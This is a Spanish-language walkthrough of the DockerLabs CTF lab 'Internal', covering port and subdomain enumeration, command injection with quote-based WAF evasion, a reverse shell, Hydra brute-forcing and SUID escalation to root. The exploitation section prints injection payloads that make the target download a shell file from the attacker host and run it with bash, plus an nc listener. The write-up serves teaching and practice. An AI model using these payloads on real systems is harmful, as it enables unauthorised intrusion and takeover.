@@ -1,0 +1,252 @@
+---
+title: Internal
+description: Resolución completa de la máquina virtual *Internal* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Internal**, desarrollada por *buda-sys* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web que redirige a un dominio interno (`internal.dl`). Mediante fuzzing de subdominios, se descubre `backup.internal.dl`, que presenta una funcionalidad de listado de directorios vulnerable a **inyección de comandos** con evasión de WAF mediante sustitución de comandos.
+Tras obtener una reverse shell como `www-data`, se encuentra un archivo con un diccionario de contraseñas que permite acceder al usuario `vault` mediante fuerza bruta con Hydra. Finalmente, se identifica un binario `vaultctl` con permisos SUID que otorga acceso directo a `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Internal',
+    Autor: 'buda-sys',
+    Dificultad: 'Fácil',
+    Fecha: '05/04/2026',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Internal.zip
+sudo bash auto_deploy.sh Internal.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Internal/{content,exploits,nmap,scripts}
+cd Internal
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1776313648/Ports_e9cth7.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Al acceder al puerto 80, se redirige automáticamente al dominio `internal.dl`. Se agrega al `/etc/hosts`:
+
+```bash
+echo '172.17.0.2  internal.dl' | sudo tee -a /etc/hosts
+```
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u "http://internal.dl" \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
+  -t 100 -e js,php,txt,html -C 404
+```
+
+No se encuentran rutas relevantes. Se procede con fuzzing de subdominios:
+
+```bash
+ffuf -c -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
+     -H "Host: FUZZ.internal.dl" -u http://internal.dl/
+```
+
+Se descubre el subdominio `backup`:
+
+![FFUF](https://res.cloudinary.com/dewqswzke/image/upload/v1776313644/FFUF_pi1jno.png)
+
+Se agrega al `/etc/hosts`:
+
+```bash
+echo '172.17.0.2  backup.internal.dl' | sudo tee -a /etc/hosts
+```
+
+![Backup](https://res.cloudinary.com/dewqswzke/image/upload/v1776313643/Backup_tdzzqz.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Inyección de comandos con evasión de WAF
+
+La aplicación permite introducir un directorio para listar su contenido, lo que sugiere una posible inyección de comandos. Se prueba:
+
+```txt
+/tmp ; id
+```
+
+El sistema devuelve un error indicando la presencia de un WAF.
+
+Se evita el WAF mediante **sustitución de comandos** con ofuscación:
+
+```txt
+$(i''d'')
+```
+
+Se obtiene **RCE**:
+
+![Test ID](https://res.cloudinary.com/dewqswzke/image/upload/v1776314605/TestId_dnrzqo.png)
+
+### 2.2 Reverse shell
+
+Se crea un archivo `shell` con una reverse shell en el host atacante y se levanta un servidor HTTP:
+
+```bash
+python3 -m http.server 80
+```
+
+Desde la web, se descarga el archivo:
+
+```txt
+$(w''g''e''t http://172.17.0.1/shell -O /tmp/shell)
+```
+
+Se inicia un listener:
+
+```bash
+nc -nlvp 443
+```
+
+Se ejecuta la reverse shell:
+
+```txt
+$(b''a''s''h /tmp/shell)
+```
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1776313649/ReverseShell_locs36.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → vault
+
+Se encuentra el archivo `/opt/.vault_pass.txt`:
+
+![Hidden pass](https://res.cloudinary.com/dewqswzke/image/upload/v1776313646/HiddenPass_cp8hal.png)
+
+Se copia el contenido como diccionario y se realiza un ataque de fuerza bruta con Hydra contra el usuario `vault`:
+
+```bash
+hydra -l vault -P .vault_pass.txt ssh://172.17.0.2 -t 64 -I
+```
+
+![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1776313647/Hydra_dsfale.png)
+
+Se obtiene la contraseña y se cambia al usuario:
+
+```bash
+su vault
+```
+
+![Vault](https://res.cloudinary.com/dewqswzke/image/upload/v1776313651/Vault_lthk7t.png)
+
+### 3.2 De vault → root
+
+Se listan binarios con permisos SUID:
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+![Find result](https://res.cloudinary.com/dewqswzke/image/upload/v1776313646/FindResult_ijdjmd.png)
+
+Se identifica el binario `/usr/local/bin/vaultctl`. Se ejecuta:
+
+```bash
+./vaultctl
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1776313650/Root_rthbp1.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Inyección de comandos en parámetro de directorio",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como www-data"
+    },
+    {
+      vulnerability: "WAF evadible mediante sustitución de comandos",
+      severity: "Alta",
+      impact: "Bypass de filtros de seguridad"
+    },
+    {
+      vulnerability: "Diccionario de contraseñas almacenado en texto plano",
+      severity: "Alta",
+      impact: "Ataques de fuerza bruta contra usuarios del sistema"
+    },
+    {
+      vulnerability: "Contraseña débil del usuario vault",
+      severity: "Media",
+      impact: "Acceso no autorizado mediante diccionario"
+    },
+    {
+      vulnerability: "Binario vaultctl con permisos SUID sin restricciones",
+      severity: "Crítica",
+      impact: "Escalada de privilegios directa a root"
+    }
+  ]}
+/>
